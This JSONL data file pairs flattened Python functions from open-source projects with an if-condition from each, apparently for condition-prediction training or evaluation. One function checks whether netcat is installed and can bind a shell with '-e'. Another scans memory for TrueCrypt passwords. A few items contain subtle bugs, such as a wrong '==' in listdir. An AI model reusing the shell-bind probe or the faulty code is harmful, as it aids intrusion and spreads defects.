{"input": "def handle_edge(self, src_id, dst_id, attrs): try: pos = attrs[\"pos\"] except KeyError: return points = self.parse_edge_pos(pos) shapes = [] for attr in (\"_draw_\", \"_ldraw_\", \"_hdraw_\", \"_tdraw_\", \"_hldraw_\", \"_tldraw_\"): if attr in attrs: parser = XDotAttrParser(self, attrs[attr]) shapes.extend(parser.parse()) if shapes: src = self.node_by_name[src_id] dst = self.node_by_name[dst_id] self.edges.append(elements.Edge(src, dst, points, shapes, attrs.get(\"tooltip\")))", "label": "if attr in attrs :"}
{"input": "def get_available_data_asset_names(self): known_assets = [] if not os.path.isdir(self.base_directory): return {\"names\": [(asset, \"path\") for asset in known_assets]} for data_asset_name in self.asset_globs.keys(): batch_paths = self._get_data_asset_paths(data_asset_name=data_asset_name) if len(batch_paths) > 0 and data_asset_name not in known_assets: known_assets.append(data_asset_name) return {\"names\": [(asset, \"path\") for asset in known_assets]}", "label": "if len ( batch_paths ) > 0 and data_asset_name not in known_assets :"}
{"input": "def _maintain_pool(self): waiting = self._docker_interface.services_waiting_by_constraints() active = self._docker_interface.nodes_active_by_constraints() for constraints, needed_dict in self._state.slots_needed(waiting, active).items(): services = needed_dict[\"services\"] nodes = needed_dict[\"nodes\"] slots_needed = needed_dict[\"slots_needed\"] if slots_needed > 0: self._spawn_nodes(constraints, services, slots_needed) elif slots_needed < 0: self._destroy_nodes(constraints, nodes, slots_needed)", "label": "if slots_needed > 0 :"}
{"input": "def retention_validator(ns): if ns.backup_retention is not None: val = ns.backup_retention if not 7 <= int(val) <= 35: raise CLIError( \"incorrect usage: --backup-retention. Range is 7 to 35 days.\" )", "label": "if not 7 <= int ( val ) <= 35 :"}
{"input": "def write(path, data, kind=\"OTHER\", dohex=0): asserttype1(data) kind = string.upper(kind) try: os.remove(path) except os.error: pass err = 1 try: if kind == \"LWFN\": writelwfn(path, data) elif kind == \"PFB\": writepfb(path, data) else: writeother(path, data, dohex) err = 0 finally: if err and not DEBUG: try: os.remove(path) except os.error: pass", "label": "elif kind == \"PFB\" :"}
{"input": "def __init__(self, zone, poll_interval=1): self.zone = zone self.poll_interval = poll_interval self.queue_client = QueueClient(zone) self.shards = [] for database in config[\"DATABASE_HOSTS\"]: if database.get(\"ZONE\") == self.zone: shard_ids = [shard[\"ID\"] for shard in database[\"SHARDS\"]] self.shards.extend( shard_id for shard_id in shard_ids if shard_id in engine_manager.engines )", "label": "if database . get ( \"ZONE\" ) == self . zone :"}
{"input": "def _postprocess_message(self, msg): if msg[\"type\"] != \"param\": return event_dim = msg[\"kwargs\"].get(\"event_dim\") if event_dim is None: return for frame in msg[\"cond_indep_stack\"]: if frame.name == self.name: value = msg[\"value\"] event_dim += value.unconstrained().dim() - value.dim() value.unconstrained()._pyro_dct_dim = frame.dim - event_dim return", "label": "if frame . name == self . name :"}
{"input": "def RemoveIdleHandler(self): if self.idleHandlerSet: debug(\"Idle handler reset\\n\") if win32ui.GetApp().DeleteIdleHandler(self.QueueIdleHandler) == 0: debug(\"Error deleting idle handler\\n\") self.idleHandlerSet = 0", "label": "if win32ui . GetApp ( ) . DeleteIdleHandler ( self . QueueIdleHandler ) == 0 :"}
{"input": "def folder_is_public(self, folder): for sub_folder in folder.folders: if not self.folder_is_public(sub_folder): return False for library_dataset in folder.datasets: ldda = library_dataset.library_dataset_dataset_association if ldda and ldda.dataset and not self.dataset_is_public(ldda.dataset): return False return True", "label": "if ldda and ldda . dataset and not self . dataset_is_public ( ldda . dataset ) :"}
{"input": "def _error_check(self, command_response): error = command_response.get(\"error\") if error: command = command_response.get(\"command\") if \"data\" in error: raise NXAPICommandError(command, error[\"data\"][\"msg\"]) else: raise NXAPICommandError(command, \"Invalid command.\")", "label": "if \"data\" in error :"}
{"input": "def find_idx_impl(arr, idx): chunks = parallel_chunks(len(arr)) new_arr = [List.empty_list(types.int64) for i in range(len(chunks))] for i in prange(len(chunks)): chunk = chunks[i] for j in range(chunk.start, chunk.stop): if arr[j] == idx: new_arr[i].append(j) return new_arr", "label": "if arr [ j ] == idx :"}
{"input": "def _l2bytes(l): # Convert a list of ints to bytes if the interpreter is Python 3 try: if bytes is not str: # In Python 2.6 and above, this call won't raise an exception # but it will return bytes([65]) as '[65]' instead of 'A' return bytes(l) raise NameError except NameError: return \"\".join(map(chr, l))", "label": "if bytes is not str :"}
{"input": "def decode(self): while True: # Sample data bits on falling clock edge. (clock_pin, data_pin) = self.wait({0: \"f\"}) self.handle_bits(data_pin) if self.bitcount == 11: (clock_pin, data_pin) = self.wait({0: \"r\"}) self.handle_bits(data_pin)", "label": "if self . bitcount == 11 :"}
{"input": "def letterrange(first, last, charset): for k in range(len(last)): for x in product(*[chain(charset)] * (k + 1)): result = \"\".join(x) if first: if first != result: continue else: first = None yield result if result == last: return", "label": "if first != result :"}
{"input": "def run(self): while not self._stop: for i in range(0, self._interval): time.sleep(1) if self._stop: self.__logger.debug(\"%s - ping thread stopped\" % self.name) return ping = PingIqProtocolEntity() self._layer.waitPong(ping.getId()) if not self._stop: self._layer.sendIq(ping)", "label": "if not self . _stop :"}
{"input": "def __init__(self): self.converters = dict() for p in dir(self): attr = getattr(self, p) if hasattr(attr, \"_converter_for\"): for p in attr._converter_for: self.converters[p] = attr", "label": "if hasattr ( attr , \"_converter_for\" ) :"}
{"input": "def consume(self): if not self.inputState.guessing: c = self.LA(1) if self.caseSensitive: self.append(c) else: # use input.LA(), not LA(), to get original case # CharScanner.LA() would toLower it. c = self.inputState.input.LA(1) self.append(c) if c and c in \"\\t\": self.tab() else: self.inputState.column += 1 self.inputState.input.consume()", "label": "if c and c in \"\\t\" :"}
{"input": "def _is_target_pattern_matched(self, pattern, targets): for target in targets: try: search_result = re.search(pattern, target) except: logger.warning( f\"Illegal regular match in mock data!\\n {traceback.format_exc()}\" ) return False if not search_result: return False return True", "label": "if not search_result :"}
{"input": "def forwards(self, orm): from sentry.models import ProjectKey for project in orm[\"sentry.Project\"].objects.all(): if orm[\"sentry.ProjectKey\"].objects.filter(project=project, user=None).exists(): continue orm[\"sentry.ProjectKey\"].objects.create( project=project, public_key=ProjectKey.generate_api_key(), secret_key=ProjectKey.generate_api_key(), )", "label": "if orm [ \"sentry.ProjectKey\" ] . objects . filter ( project = project , user = None ) . exists ( ) :"}
{"input": "def prepare_content_length(self, body): if hasattr(body, \"seek\") and hasattr(body, \"tell\"): curr_pos = body.tell() body.seek(0, 2) end_pos = body.tell() self.headers[\"Content-Length\"] = builtin_str(max(0, end_pos - curr_pos)) body.seek(curr_pos, 0) elif body is not None: l = super_len(body) if l: self.headers[\"Content-Length\"] = builtin_str(l) elif (self.method not in (\"GET\", \"HEAD\")) and ( self.headers.get(\"Content-Length\") is None ): self.headers[\"Content-Length\"] = \"0\"", "label": "if l :"}
{"input": "def listdir(path=\".\"): is_bytes = isinstance(path, bytes) res = [] for dirent in ilistdir(path): fname = dirent[0] if is_bytes: good = fname != b\".\" and fname == b\"..\" else: good = fname != \".\" and fname != \"..\" if good: if not is_bytes: fname = fsdecode(fname) res.append(fname) return res", "label": "if is_bytes :"}
{"input": "def _validate_mappings(self): # Validate mapping references for m in self.mapping.mapping_rules: for policy_id in m.policy_ids: if policy_id not in self.policies: raise ReferencedObjectNotFoundError( reference_id=policy_id, reference_type=\"policy\" ) for w in m.whitelist_ids: if w not in self.whitelists: raise ReferencedObjectNotFoundError( reference_id=w, reference_type=\"whitelist\" )", "label": "if policy_id not in self . policies :"}
{"input": "def get_field_by_name(obj, field): # Dereference once if obj.type.code == gdb.TYPE_CODE_PTR: obj = obj.dereference() for f in re.split(\"(->|\\.|\\[\\d+\\])\", field): if not f: continue if f == \"->\": obj = obj.dereference() elif f == \".\": pass elif f.startswith(\"[\"): n = int(f.strip(\"[]\")) obj = obj.cast(obj.dereference().type.pointer()) obj += n obj = obj.dereference() else: obj = obj[f] return obj", "label": "elif f == \".\" :"}
{"input": "def sendall(self, data): len_data = len(data) os_write = os.write fileno = self._fileno try: total_sent = os_write(fileno, data) except OSError as e: if get_errno(e) != errno.EAGAIN: raise IOError(*e.args) total_sent = 0 while total_sent < len_data: self._trampoline(self, write=True) try: total_sent += os_write(fileno, data[total_sent:]) except OSError as e: if get_errno(e) != errno.EAGAIN: raise IOError(*e.args)", "label": "if get_errno ( e ) != errno . EAGAIN :"}
{"input": "def dr_relation(self, C, trans, nullable): state, N = trans terms = [] g = self.lr0_goto(C[state], N) for p in g: if p.lr_index < p.len - 1: a = p.prod[p.lr_index + 1] if a in self.grammar.Terminals: if a not in terms: terms.append(a) # This extra bit is to handle the start state if state == 0 and N == self.grammar.Productions[0].prod[0]: terms.append(\"$end\") return terms", "label": "if p . lr_index < p . len - 1 :"}
{"input": "def canonical_standard_headers(self, headers): interesting_headers = [\"content-md5\", \"content-type\", \"date\"] hoi = [] if \"Date\" in headers: del headers[\"Date\"] headers[\"Date\"] = self._get_date() for ih in interesting_headers: found = False for key in headers: lk = key.lower() if headers[key] is not None and lk == ih: hoi.append(headers[key].strip()) found = True if not found: hoi.append(\"\") return \"\\n\".join(hoi)", "label": "if headers [ key ] is not None and lk == ih :"}
{"input": "def _fatal_error(self, exc, message=\"Fatal error on pipe transport\"): try: if isinstance(exc, OSError): if self._loop.get_debug(): logger.debug(\"%r: %s\", self, message, exc_info=True) else: self._loop.call_exception_handler( { \"message\": message, \"exception\": exc, \"transport\": self, \"protocol\": self._protocol, } ) finally: self._force_close(exc)", "label": "if self . _loop . get_debug ( ) :"}
{"input": "def match_empty(self, el): \"\"\"Check if element is empty (if requested).\"\"\" is_empty = True for child in self.get_children(el, tags=False): if self.is_tag(child): is_empty = False break elif self.is_content_string(child) and RE_NOT_EMPTY.search(child): is_empty = False break return is_empty", "label": "if self . is_tag ( child ) :"}
{"input": "def _sortNodes(self, nodes, sortBy, sortDir, force=False): if force or self._sortedBy != sortBy or self._sortDir != sortDir: log.debug(\"KPFTree::_sortNodes()\") if sortDir != 0: nodes.sort(lambda a, b: compareNodeFolder(a, b, sortBy, sortDir)) else: nodes.sort(lambda a, b: compareNode(a, b, sortBy)) self._sortDir = sortDir # cache sort order self._sortedBy = sortBy # cache sort order else: log.debug(\"KPFTree::_sortNodes:: already sorted\")", "label": "if sortDir != 0 :"}
{"input": "def log(self, request): web_socket = WebSocketResponse() await web_socket.prepare(request) self.app[\"websockets\"].add(web_socket) try: async for msg in web_socket: if msg.type == WSMsgType.TEXT: if msg.data == \"close\": await web_socket.close() elif msg.type == WSMsgType.ERROR: print( \"web socket connection closed with exception %s\" % web_socket.exception() ) finally: self.app[\"websockets\"].remove(web_socket) return web_socket", "label": "if msg . type == WSMsgType . TEXT :"}
{"input": "def analyze_items(items, category_id, agg_data): for item in items: if not agg_data[\"cat_asp\"].get(category_id, None): agg_data[\"cat_asp\"][category_id] = [] agg_data[\"cat_asp\"][category_id].append( float(item.sellingStatus.currentPrice.value) ) if getattr(item.listingInfo, \"watchCount\", None): agg_data[\"watch_count\"] += int(item.listingInfo.watchCount) if getattr(item, \"postalCode\", None): agg_data[\"postal_code\"] = item.postalCode", "label": "if getattr ( item . listingInfo , \"watchCount\" , None ) :"}
{"input": "def __init__( self, filename, metadata_name, metadata_column, message=\"Value for metadata not found.\", line_startswith=None, split=\"\\t\", ): self.metadata_name = metadata_name self.message = message self.valid_values = [] for line in open(filename): if line_startswith is None or line.startswith(line_startswith): fields = line.split(split) if metadata_column < len(fields): self.valid_values.append(fields[metadata_column].strip())", "label": "if line_startswith is None or line . startswith ( line_startswith ) :"}
{"input": "def iter_flat(self): for f in self.layout: e = getattr(self, f[0]) if isinstance(e, Signal): if len(f) == 3: yield e, f[2] else: yield e, DIR_NONE elif isinstance(e, Record): yield from e.iter_flat() else: raise TypeError", "label": "if len ( f ) == 3 :"}
{"input": "def shell(self, cmd): if self._debug: logger.log(cmd) if is_sequence(cmd): cmd = \"\".join(cmd) if self._log: if self._verbose: cmd = \"(%s) 2>&1 | tee '%s'\" % (cmd, self._log) else: cmd = \"(%s) >> '%s' 2>&1\" % (cmd, self._log) returncode = subprocess.call(cmd, shell=True, cwd=self._cwd) if returncode: raise ShellCommandException(\"%s: failed to `%s`\" % (returncode, cmd))", "label": "if self . _verbose :"}
{"input": "def _to_sentences(self, lines): text = \"\" sentence_objects = [] for line in lines: if isinstance(line, Sentence): if text: sentences = self.tokenize_sentences(text) sentence_objects += map(self._to_sentence, sentences) sentence_objects.append(line) text = \"\" else: text += \" \" + line text = text.strip() if text: sentences = self.tokenize_sentences(text) sentence_objects += map(self._to_sentence, sentences) return sentence_objects", "label": "if text :"}
{"input": "def _get_editable_fields(cls): fds = set([]) for field in cls._meta.concrete_fields: if hasattr(field, \"attname\"): if field.attname == \"id\": continue elif field.attname.endswith(\"ptr_id\"): # polymorphic fields should always be non-editable, see: # https://github.com/django-polymorphic/django-polymorphic/issues/349 continue if getattr(field, \"editable\", True): fds.add(field.attname) return fds", "label": "if field . attname == \"id\" :"}
{"input": "def get_router_id(path, local_bgp_id): path_source = path.source if path_source is None: return local_bgp_id else: originator_id = path.get_pattr(BGP_ATTR_TYPE_ORIGINATOR_ID) if originator_id: return originator_id.value return path_source.protocol.recv_open_msg.bgp_identifier", "label": "if originator_id :"}
{"input": "def visit_SelectionSetNode(self, node): elements = [] for sel in node.selections: if not self._should_include(sel.directives): continue spec = self.visit(sel) if spec is not None: elements.append(spec) elements = self.combine_field_results(elements) return elements", "label": "if spec is not None :"}
{"input": "def update_groups_of_conv(self): for op in self.ops(): if op.type() == \"depthwise_conv2d\" or op.type() == \"depthwise_conv2d_grad\": op.set_attr(\"groups\", op.inputs(\"Filter\")[0].shape()[0])", "label": "if op . type ( ) == \"depthwise_conv2d\" or op . type ( ) == \"depthwise_conv2d_grad\" :"}
{"input": "def init_constraints(self, batch_constraints: Optional[Tensor], beam_size: int): self.constraint_states = [] for constraint_tensor in batch_constraints: if self.representation == \"ordered\": constraint_state = OrderedConstraintState.create(constraint_tensor) elif self.representation == \"unordered\": constraint_state = UnorderedConstraintState.create(constraint_tensor) self.constraint_states.append([constraint_state for i in range(beam_size)])", "label": "elif self . representation == \"unordered\" :"}
{"input": "def startInputThread(self): # cv.acquire() # Fix Python 2.x. global input try: input = raw_input except NameError: pass while True: cmd = ( self._queuedCmds.pop(0) if len(self._queuedCmds) else input(self.getPrompt()).strip() ) wait = self.execCmd(cmd) if wait: self.acceptingInput = False self.blockingQueue.get(True) # cv.wait() # self.inputThread.wait() self.acceptingInput = True", "label": "if len ( self . _queuedCmds )"}
{"input": "def apply_list(self, expr, rules, evaluation): \"ReplaceRepeated[expr_, rules_]\" try: rules, ret = create_rules(rules, expr, \"ReplaceRepeated\", evaluation) except PatternError: evaluation.message(\"Replace\", \"reps\", rules) return None if ret: return rules while True: evaluation.check_stopped() result, applied = expr.apply_rules(rules, evaluation) if applied: result = result.evaluate(evaluation) if applied and not result.same(expr): expr = result else: break return result", "label": "if applied and not result . same ( expr ) :"}
{"input": "def local_gpua_softmax_dnn_grad(op, ctx_name, inputs, outputs): if not dnn_available(ctx_name): return ins = [] for n in inputs: n = as_gpuarray_variable(n, ctx_name) if n.ndim != 2: return ins.append(n.dimshuffle(0, \"x\", 1, \"x\")) out = GpuDnnSoftmaxGrad(\"accurate\", \"instance\")( gpu_contiguous(ins[0]), gpu_contiguous(ins[1]) ) return [out.dimshuffle(0, 2)]", "label": "if n . ndim != 2 :"}
{"input": "def _geo_indices(cls, inspected=None): inspected = inspected or [] geo_indices = [] inspected.append(cls) for field in cls._fields.values(): if hasattr(field, \"document_type\"): field_cls = field.document_type if field_cls in inspected: continue if hasattr(field_cls, \"_geo_indices\"): geo_indices += field_cls._geo_indices(inspected) elif field._geo_index: geo_indices.append(field) return geo_indices", "label": "if hasattr ( field_cls , \"_geo_indices\" ) :"}
{"input": "def get_skip_list(self, handle): todo = [handle] skip = [handle] while todo: handle = todo.pop() for child in self.dbstate.db.find_backlink_handles(handle, [\"Place\"]): if child[1] not in skip: todo.append(child[1]) skip.append(child[1]) return skip", "label": "if child [ 1 ] not in skip :"}
{"input": "def convertstore(self, inputstore, includefuzzy=False): \"\"\"converts a file to .lang format\"\"\" thetargetfile = lang.LangStore(mark_active=self.mark_active) # Run over the po units for pounit in inputstore.units: if pounit.isheader() or not pounit.istranslatable(): continue newunit = thetargetfile.addsourceunit(pounit.source) if includefuzzy or not pounit.isfuzzy(): newunit.settarget(pounit.target) else: newunit.settarget(\"\") if pounit.getnotes(\"developer\"): newunit.addnote(pounit.getnotes(\"developer\"), \"developer\") return thetargetfile", "label": "if pounit . isheader ( ) or not pounit . istranslatable ( ) :"}
{"input": "def api_read(self): files = [] files.append(\"/bin/netcat\") files.append(\"/etc/alternative/netcat\") files.append(\"/bin/nc\") # init variables installed = False support = False path = None for _file in files: file_content = self.shell.read(_file) if file_content: installed = True path = _file if \"-e filename\" in file_content: support = True break result = { \"netcat_installed\": installed, \"supports_shell_bind\": support, \"path\": path, } return result", "label": "if file_content :"}
{"input": "def _create_waiter(self, func_name): if self._waiter is not None: if self._cancelling: if not self._waiter.done(): raise RuntimeError( \"%s() called while connection is \" \"being cancelled\" % func_name ) else: raise RuntimeError( \"%s() called while another coroutine is \" \"already waiting for incoming \" \"data\" % func_name ) self._waiter = create_future(self._loop) return self._waiter", "label": "if self . _cancelling :"}
{"input": "def calculate(self): addr_space = utils.load_as(self._config) for mod in modules.lsmod(addr_space): # Finding the TC kernel module if str(mod.BaseDllName).lower() != \"truecrypt.sys\": continue for offset, password in self.scan_module( addr_space, mod.DllBase, self._config.MIN_LENGTH ): yield offset, password", "label": "if str ( mod . BaseDllName ) . lower ( ) != \"truecrypt.sys\" :"}
{"input": "def on_touch_up(self, touch): try: if not self.h_picker_touch: return if not self.animating: if touch.grab_current is not self: if self.picker == \"hours\": self.picker = \"minutes\" except AttributeError: pass super().on_touch_up(touch)", "label": "if not self . animating :"}
{"input": "def handle(self, *args, **options): dry_run = options.get(\"dry_run\", False) state = options.get(\"state\", None) if not dry_run: script_utils.add_file_logger(logger, __file__) with transaction.atomic(): add_reviews_notification_setting( notification_type=options[\"notification\"], state=state ) if dry_run: raise RuntimeError(\"Dry run, transaction rolled back.\")", "label": "if dry_run :"}
{"input": "def __call__(self, es, params): ops = 0 indices = mandatory(params, \"indices\", self) only_if_exists = params.get(\"only-if-exists\", False) request_params = params.get(\"request-params\", {}) for index_name in indices: if not only_if_exists: es.indices.delete(index=index_name, params=request_params) ops += 1 elif only_if_exists and es.indices.exists(index=index_name): self.logger.info(\"Index [%s] already exists. Deleting it.\", index_name) es.indices.delete(index=index_name, params=request_params) ops += 1 return ops, \"ops\"", "label": "if not only_if_exists :"}
{"input": "def find_first_of_filetype(content, filterfiltype, attr=\"name\"): \"\"\"Find the first of the file type.\"\"\" filename = \"\" for _filename in content: if isinstance(_filename, str): if _filename.endswith(f\".{filterfiltype}\"): filename = _filename break else: if getattr(_filename, attr).endswith(f\".{filterfiltype}\"): filename = getattr(_filename, attr) break return filename", "label": "if _filename . endswith ( f\".{filterfiltype}\" ) :"}
{"input": "def join(s, *p): path = s for t in p: if (not s) or isabs(t): path = t continue if t[:1] == \":\": t = t[1:] if \":\" not in path: path = \":\" + path if path[-1:] != \":\": path = path + \":\" path = path + t return path", "label": "if \":\" not in path :"}
{"input": "def cell_double_clicked(self, row, column): if column == 3: archive_name = self.selected_archive_name() if not archive_name: return mount_point = self.mount_points.get(archive_name) if mount_point is not None: QDesktopServices.openUrl(QtCore.QUrl(f\"file:///{mount_point}\"))", "label": "if mount_point is not None :"}
{"input": "def parseLink(line): parts = line.split() optional = parts[0] == \"Link*:\" assert optional or parts[0] == \"Link:\" attrs = {} for attr in parts[1:]: k, v = attr.split(\"=\", 1) if k[-1] == \"*\": attr_optional = 1 k = k[:-1] else: attr_optional = 0 attrs[k] = (attr_optional, v) return (optional, attrs)", "label": "if k [ - 1 ] == \"*\" :"}
{"input": "def should_wait(self, offer_hash: str): with self._lock: if self._offer_hash is not None: if self._offer_hash != offer_hash: logger.debug( \"already processing another offer (%s vs %s)\", self._offer_hash, offer_hash, ) return True if self._started == self._wtct_num_subtasks: logger.info(\"all subtasks for `%s` have been started\", self._offer_hash) return True return False", "label": "if self . _offer_hash is not None :"}
{"input": "def list_urls(self): for idx, job in enumerate(self.urlwatcher.jobs): if self.urlwatch_config.verbose: print(\"%d: %s\" % (idx + 1, repr(job))) else: pretty_name = job.pretty_name() location = job.get_location() if pretty_name != location: print(\"%d: %s ( %s )\" % (idx + 1, pretty_name, location)) else: print(\"%d: %s\" % (idx + 1, pretty_name)) return 0", "label": "if pretty_name != location :"}
{"input": "def _encode_realm(self, realm): # override default _encode_realm to fill in default realm field if realm is None: realm = self.default_realm if realm is None: raise TypeError( \"you must specify a realm explicitly, \" \"or set the default_realm attribute\" ) return self._encode_field(realm, \"realm\")", "label": "if realm is None :"}
{"input": "def set(sensor_spec: dict, **kwargs): for key, value in kwargs.items(): if key == \"position\": sensor_spec[\"transform\"] = SensorSpecs.get_position(value) elif key == \"attachment_type\": sensor_spec[key] = SensorSpecs.ATTACHMENT_TYPE[value] elif key == \"color_converter\": sensor_spec[key] = SensorSpecs.COLOR_CONVERTER[value]", "label": "elif key == \"color_converter\" :"}
{"input": "def _check_arguments(self, arch, state): # TODO: add calling convention detection to individual functions, and use that instead of the # TODO: default calling convention of the platform cc = DEFAULT_CC[arch.name](arch) # type: s_cc.SimCC for i, expected_arg in enumerate(self.arguments): if expected_arg is None: continue real_arg = cc.arg(state, i) expected_arg_type, expected_arg_value = expected_arg r = self._compare_arguments( state, expected_arg_type, expected_arg_value, real_arg ) if not r: return False return True", "label": "if not r :"}
{"input": "def all_projects(): if not REPODIR: return # Future: make this path parameterisable. excludes = set([\"tempest\", \"requirements\"]) for name in PROJECTS: name = name.strip() short_name = name.split(\"/\")[-1] try: with open(os.path.join(REPODIR, short_name, \"setup.py\"), \"rt\") as f: if \"pbr\" not in f.read(): continue except IOError: continue if short_name in excludes: continue yield (short_name, dict(name=name, short_name=short_name))", "label": "if \"pbr\" not in f . read ( ) :"}
{"input": "def get_converter(self, key, default=None): \"\"\"Gets a converter for the given key.\"\"\" if key in self._vars: return self._vars[key].convert # necessary for keys that match regexes, such as `*PATH`s for k, var in self._vars.items(): if isinstance(k, str): continue if k.match(key) is not None: converter = var.convert self._vars[key] = var break else: converter = self._get_default_converter(default=default) return converter", "label": "if isinstance ( k , str ) :"}
{"input": "def get_artist(self, name): artist = self.artists.get(name) if not artist: if self.use_db: try: artist = q(m.Artist).filter_by(name=name).one() except NoResultFound: pass if artist and self.ram_cache: self.add_artist(artist) return artist", "label": "if artist and self . ram_cache :"}
{"input": "def move(self, x, y): offset = self.h width = max((len(val.get()) for val in self.values)) for i, label in enumerate(self.labels): if self.values[i].get() != \"\": label.place(x=x, y=y + offset) label.config( width=width, bg=(self.fg if self.selected == i else self.bg), ) offset += self.h + (self.pady * 2) else: label.place(x=9999, y=9999) return", "label": "if self . values [ i ] . get ( ) != \"\" :"}
{"input": "def visit_Assign(self, node): if len(node.targets) == 1: if isinstance(node.targets[0], ast.Subscript): plugPath = self.__plugPath(self.__path(node.targets[0])) if plugPath: self.plugWrites.add(plugPath) self.visit(node.value)", "label": "if isinstance ( node . targets [ 0 ] , ast . Subscript ) :"}
{"input": "def _minimal_replacement_cost(self, first, second): first_symbols, second_symbols = set(), set() removal_cost, insertion_cost = 0, 0 for a, b in itertools.zip_longest(first, second, fillvalue=None): if a is not None: first_symbols.add(a) if b is not None: second_symbols.add(b) removal_cost = max(removal_cost, len(first_symbols - second_symbols)) insertion_cost = max(insertion_cost, len(second_symbols - first_symbols)) return min(removal_cost, insertion_cost)", "label": "if a is not None :"}
{"input": "def normalize_stroke(stroke): letters = set(stroke) if letters & _NUMBERS: if system.NUMBER_KEY in letters: stroke = stroke.replace(system.NUMBER_KEY, \"\") # Insert dash when dealing with 'explicit' numbers m = _IMPLICIT_NUMBER_RX.search(stroke) if m is not None: start = m.start(2) return stroke[:start] + \"-\" + stroke[start:] if \"-\" in letters: if stroke.endswith(\"-\"): stroke = stroke[:-1] elif letters & system.IMPLICIT_HYPHENS: stroke = stroke.replace(\"-\", \"\") return stroke", "label": "if m is not None :"}
{"input": "def serve_json(self, args=None): request = current.request response = current.response response.headers[\"Content-Type\"] = \"application/json; charset=utf-8\" if not args: args = request.args d = dict(request.vars) if args and args[0] in self.json_procedures: s = self.call_service_function(self.json_procedures[args[0]], *args[1:], **d) if hasattr(s, \"as_list\"): s = s.as_list() return response.json(s) self.error()", "label": "if hasattr ( s , \"as_list\" ) :"}
{"input": "def get_art_abs(story_file): lines = read_text_file(story_file) lines = [line.lower() for line in lines] lines = [fix_missing_period(line) for line in lines] article_lines = [] highlights = [] next_is_highlight = False for idx, line in enumerate(lines): if line == \"\": continue # empty line elif line.startswith(\"@highlight\"): next_is_highlight = True elif next_is_highlight: highlights.append(line) else: article_lines.append(line) article = \" \".join(article_lines) abstract = \" \".join(highlights) return article, abstract", "label": "elif next_is_highlight :"}
{"input": "def _get_commands(): proc = Popen([\"react-native\", \"--help\"], stdout=PIPE) should_yield = False for line in proc.stdout.readlines(): line = line.decode().strip() if not line: continue if \"Commands:\" in line: should_yield = True continue if should_yield: yield line.split(\" \")[0]", "label": "if not line :"}
{"input": "def _wait_for_state(self, server_id, state, retries=50): for i in (0, retries): server = self.ex_get_server(server_id) if server.extra[\"status\"][\"state\"] == state: return sleep(5) if i == retries: raise Exception(\"Retries count reached\")", "label": "if server . extra [ \"status\" ] [ \"state\" ] == state :"}
{"input": "def add_letter(inner_letter): if inner_letter in alphabet: wordTrans.append(alphabet[inner_letter]) else: l2 = stringTools.stripAccents(inner_letter) if l2 == inner_letter: raise KeyError(\"Cannot translate \" + inner_letter) wordTrans.append(alphabet[\"^\"]) wordTrans.append(alphabet[l2])", "label": "if l2 == inner_letter :"}
{"input": "def _parse_message(data): try: jsonrpc_message = json.loads(data, encoding=\"utf-8\") if jsonrpc_message.get(\"jsonrpc\") != \"2.0\": raise InvalidRequest() del jsonrpc_message[\"jsonrpc\"] if \"result\" in jsonrpc_message.keys() or \"error\" in jsonrpc_message.keys(): return Response(**jsonrpc_message) else: return Request(**jsonrpc_message) except json.JSONDecodeError: raise ParseError() except TypeError: raise InvalidRequest()", "label": "if \"result\" in jsonrpc_message . keys ( ) or \"error\" in jsonrpc_message . keys ( ) :"}
{"input": "def get_buildings_in_range(self): # TODO Think about moving this to the Settlement class buildings = self.settlement.buildings for building in buildings: if building is self: continue if ( distances.distance_rect_rect(self.position, building.position) <= self.radius ): yield building", "label": "if building is self :"}
{"input": "def get_tab_title(self, uuid=None): \"\"\"Return the title of a parent tab of a given terminal\"\"\" maker = Factory() terminal = self.terminator.find_terminal_by_uuid(uuid) window = terminal.get_toplevel() root_widget = window.get_children()[0] if maker.isinstance(root_widget, \"Notebook\"): for tab_child in root_widget.get_children(): terms = [tab_child] if not maker.isinstance(terms[0], \"Terminal\"): terms = enumerate_descendants(tab_child)[1] if terminal in terms: return root_widget.get_tab_label(tab_child).get_label()", "label": "if not maker . isinstance ( terms [ 0 ] , \"Terminal\" ) :"}
{"input": "def is_valid_origin(origin): if not settings.SENTRY_ALLOW_ORIGIN: return False if settings.SENTRY_ALLOW_ORIGIN == \"*\": return True if not origin: return False origin = origin.lower() for value in settings.SENTRY_ALLOW_ORIGIN: if isinstance(value, string_types): if value.lower() == origin: return True else: if value.match(origin): return True return False", "label": "if isinstance ( value , string_types ) :"}
{"input": "def addr_func(ctx): nodes = ctx.xpathEval(base_xpath + \"/ip\") nodes = nodes or [] ret = [] for node in nodes: addr = node.prop(\"address\") pref = node.prop(\"prefix\") if not addr: continue if pref: addr += \"/%s\" % pref ret.append(addr) return ret", "label": "if pref :"}
{"input": "def _select_delete(self, select, args, row_index=0, arg_index=0): count = 0 delete = \"DELETE FROM Cache WHERE rowid IN (%s)\" try: while True: with self._transact() as (sql, cleanup): rows = sql(select, args).fetchall() if not rows: break count += len(rows) sql(delete % \",\".join(str(row[0]) for row in rows)) for row in rows: args[arg_index] = row[row_index] cleanup(row[-1]) except Timeout: raise Timeout(count) return count", "label": "if not rows :"}
{"input": "def _set_checkpointer(self, train_config): if train_config[\"checkpoint\"]: # Default to valid split for checkpoint metric checkpoint_config = train_config[\"checkpoint_config\"] checkpoint_metric = checkpoint_config[\"checkpoint_metric\"] if checkpoint_metric.count(\"/\") == 0: checkpoint_config[\"checkpoint_metric\"] = f\"valid/{checkpoint_metric}\" self.checkpointer = Checkpointer( checkpoint_config, verbose=self.config[\"verbose\"] ) else: self.checkpointer = None", "label": "if checkpoint_metric . count ( \"/\" ) == 0 :"}
{"input": "def mlt_version_is_greater_correct(test_version): runtime_ver = mlt_version.split(\".\") test_ver = test_version.split(\".\") if runtime_ver[0] > test_ver[0]: return True elif runtime_ver[0] == test_ver[0]: if runtime_ver[1] > test_ver[1]: return True elif runtime_ver[1] == test_ver[1]: if runtime_ver[2] > test_ver[2]: return True return False", "label": "elif runtime_ver [ 1 ] == test_ver [ 1 ] :"}
{"input": "def generate_scraper_test(class_name, host_name): with open(\"templates/test_scraper.py\") as source: code = source.read() program = ast.parse(code) state = GenerateTestScraperState(class_name, host_name, code) for node in ast.walk(program): if not state.step(node): break output = f\"tests/test_{class_name.lower()}.py\" with open(output, \"w\") as target: target.write(state.result())", "label": "if not state . step ( node ) :"}
